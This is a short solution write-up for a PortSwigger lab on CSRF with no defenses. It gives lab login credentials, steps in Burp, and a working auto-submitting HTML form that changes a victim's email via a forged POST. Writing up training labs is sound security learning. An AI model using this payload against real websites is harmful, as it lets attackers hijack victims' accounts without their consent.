# Cross Site Request Forgery (CSRF)

## Lab 1: CSRF vulnerability with no defenses

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter

### Sol :

Login with the credentials `wiener:peter` and update the email by giving new email in email box.

Find the request in the `HTTP history` of proxy.

Click `Go to exploit server` in the lab window.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/63f4ed20-c2f3-49bc-9b7d-196de1dc4761)

In body section, give following HTML code:

      <form method="POST" action="https://0a03006704daa24e806f67c500b50039.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="wiener%40web-security-academy.net">
    </form>
    <script>
        document.forms[0].submit();
    </script>

* Right-click on the request and select `Engagement tools -> Generate CSRF PoC`. Enable the option to include an `auto-submit script` and click `Regenerate`.
* Copy the HTML code and paste it into the exploit server body code.
* Change the email parameter value.
* Deliver it to the victim.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a0cfa7ea-e6c1-47ae-a2cf-98a1b7320d09)

* Thus, the lab is solved.
